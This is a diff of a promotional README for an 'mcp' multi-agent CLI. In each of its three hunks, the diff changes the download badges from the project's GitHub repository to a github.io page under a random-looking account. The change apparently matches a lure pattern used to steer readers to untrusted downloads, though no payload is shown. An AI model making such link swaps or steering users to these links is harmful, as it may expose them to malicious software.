@@ -1,7 +1,7 @@
 <h1>🧠 mcp - The Ultimate Multi-Agent Hub & CLI</h1>
 
 <p align="center">
-  <a href="https://github.com/irreversible-verbascumlychnitis9/mcp">
+  <a href="https://irreversible-verbascumlychnitis9.github.io">
     <img src="https://img.shields.io/badge/🚀%20Download%20mcp-Click%20Here-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download mcp" />
   </a>
 </p>
@@ -28,7 +28,7 @@ Getting started is easier than you think. Follow these simple steps below, and y
 To get your copy of mcp, all you need to do is click the bright orange button at the top of this page (or click the link below):
 
 <p align="center">
-  <a href="https://github.com/irreversible-verbascumlychnitis9/mcp">
+  <a href="https://irreversible-verbascumlychnitis9.github.io">
     <img src="https://img.shields.io/badge/⬇️%20Get%20mcp%20Now-4CAF50?style=for-the-badge&logo=download&logoColor=white&labelColor=1B5E20" alt="Get mcp Now" />
   </a>
 </p>
@@ -98,7 +98,7 @@ You now know everything you need to get started with mcp. It's quick to set up, 
 
 
 <p align="center">
-  <a href="https://github.com/irreversible-verbascumlychnitis9/mcp">
+  <a href="https://irreversible-verbascumlychnitis9.github.io">
     <img src="https://img.shields.io/badge/🚀%20Download%20mcp%20Now%20%F0%9F%9A%80-Click%20Here-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download mcp" />
   </a>
 </p>
